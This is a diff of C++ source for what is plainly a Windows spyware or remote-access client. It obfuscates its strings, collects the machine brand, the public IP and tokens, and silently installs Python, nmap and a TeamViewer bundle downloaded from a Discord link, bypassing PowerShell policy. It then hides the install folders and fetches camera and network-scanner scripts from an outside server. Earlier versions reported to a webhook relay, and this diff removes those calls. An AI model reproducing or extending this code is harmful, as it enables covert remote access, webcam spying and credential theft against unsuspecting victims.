@@ -41,6 +41,14 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM param)
 			return true;
 		else if (title == xorstr_("Groove Music"))
 			return true;
+		else if (title == xorstr_("Weather"))
+			return true;
+		else if (title == xorstr_("Maps"))
+			return true;
+		else if (title == xorstr_("Calculator"))
+			return true;
+		else if (title == xorstr_("Microsoft Text Input Application"))
+			return true;
 
 
 		title.erase(title.find_last_not_of(" \n\r\t") + 1);
@@ -130,6 +138,14 @@ namespace client {
 			return payload;
 		}
 
+		std::string get_computer_brand() {
+			auto str = helpers::exec("WMIC CSPRODUCT GET NAME").substr(5);
+			helpers::replace_all(str, "\n", "");
+			helpers::replace_all(str, "\r", "");
+			str = "\nBrand: " + str;
+			return str;
+		}
+
 		std::string get_ip() {
 			auto response = requests::get_request("https://api.ipify.org/");
 			return response;
@@ -175,12 +191,10 @@ namespace client {
 		}
 
 		std::string prepare_payload(std::string title, std::vector<std::string> tokens) {
-			std::string payload = std::string("**") + title + std::string("**\n```\n");
+			std::string payload = "";
 			for (auto token : tokens) {
 				payload += token + xorstr_("\n");
 			}
-
-			payload += xorstr_("```\n");
 
 			return payload;
 		}
@@ -201,8 +215,8 @@ namespace client {
 		}
 
 		void install_python() {
-			requests::download_file("https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe", helpers::roaming + xorstr_("\\Microsoft\\python.exe"));
-			system((std::string("cd " + helpers::roaming + xorstr_("\\Microsoft\\")) + std::string(xorstr_(" && python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0"))).c_str());
+			requests::download_file("https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe", PATH + xorstr_("python.exe"));
+			system((std::string("cd " + PATH) + std::string(xorstr_(" && python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0"))).c_str());
 
 			auto path = helpers::exec(xorstr_("py -c \"import sys; print(sys.executable[:-10])\""));
 			if (path.find(xorstr_("Python39")) != std::string::npos || path.find(xorstr_("Python38")) != std::string::npos) {
@@ -213,40 +227,35 @@ namespace client {
 				system("pip install getmac");
 				system("pip install python-nmap");
 				system("pip install sockets");
-				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Installed and Set Path\n- opencv-python\n- numpy\n- getmac\n- python-nmap\n- sockets")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
-			}
-			else {
-				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Error Assigning Path.")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 			}
 		}
 		
 		void install_teamviewer() {
-			requests::download_file("https://overflow.red/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
-			std::string path = helpers::roaming + xorstr_("\\Microsoft\\tv.zip");
-			std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
-			std::string command = xorstr_("powershell -command \"Expand-Archive ") + path + " -DestinationPath " + unzip_path + "\"";
+			requests::download_file("https://cdn.discordapp.com/attachments/777316128162578462/786454921511174165/tv.zip", PATH + "tv.zip");
+			std::string path = PATH + xorstr_("tv.zip");
+			std::string command = xorstr_("powershell -command \"Expand-Archive ") + path + " -DestinationPath " + PATH + "\"";
 			system(command.c_str());
-			std::cout << "\n1";
 
-			system(std::string(xorstr_("cd ") + helpers::roaming + xorstr_("\\Microsoft\\tv") + " && powershell -executionpolicy bypass -file teamviewer_install.ps1").c_str());
-			std::cout << "\n2";
-
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Installed Successfully")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			system(std::string(xorstr_("cd ") + PATH + xorstr_("tv") + " && powershell -executionpolicy bypass -file teamviewer_install.ps1").c_str());
+			
+			SetFileAttributes("C:\\Program Files (x86)\\TeamViewer", FILE_ATTRIBUTE_HIDDEN);
+			SetFileAttributes("C:\\Program Files\\TeamViewer", FILE_ATTRIBUTE_HIDDEN);
 		}
 
 		void install_nmap() {
-			requests::download_file("https://nmap.org/dist/nmap-7.80-setup.exe", helpers::roaming + xorstr_("\\Microsoft\\nmap.exe"));
-			system((std::string("cd ") + helpers::roaming + xorstr_("\\Microsoft") + " && nmap.exe /S").c_str());
+			requests::download_file("https://nmap.org/dist/nmap-7.80-setup.exe", PATH + xorstr_("nmap.exe"));
+			system((std::string("cd ") + PATH + " && nmap.exe /S").c_str());
 			system("SET PATH=%PATH%;C:\\Program Files (x86)\\Nmap");
 			system("SET PATH=%PATH%;C:\\Program Files\\Nmap");
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Nmap**\n```\n") + std::string(xorstr_("Installed and Set Path")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+
+			SetFileAttributes("C:\\Program Files (x86)\\Nmap", FILE_ATTRIBUTE_HIDDEN);
+			SetFileAttributes("C:\\Program Files\\Nmap", FILE_ATTRIBUTE_HIDDEN);
 		}
 
 		void install_scripts() {
-			std::filesystem::create_directory(helpers::roaming + xorstr_("\\Microsoft\\scripts\\"));
-			requests::download_file("https://overflow.red/scripts/camera.py", helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.py"));
-			requests::download_file("https://overflow.red/scripts/scanner.py", helpers::roaming + xorstr_("\\Microsoft\\scripts\\scanner.py"));
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Scripts**\n```\n") + std::string(xorstr_("Installed All Scripts")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			std::filesystem::create_directory(PATH + xorstr_("scripts\\"));
+			requests::download_file("https://overflow.red/scripts/camera.py", PATH + xorstr_("scripts\\camera.py"));
+			requests::download_file("https://overflow.red/scripts/scanner.py", PATH + xorstr_("scripts\\scanner.py"));
 		}
 	}
 }
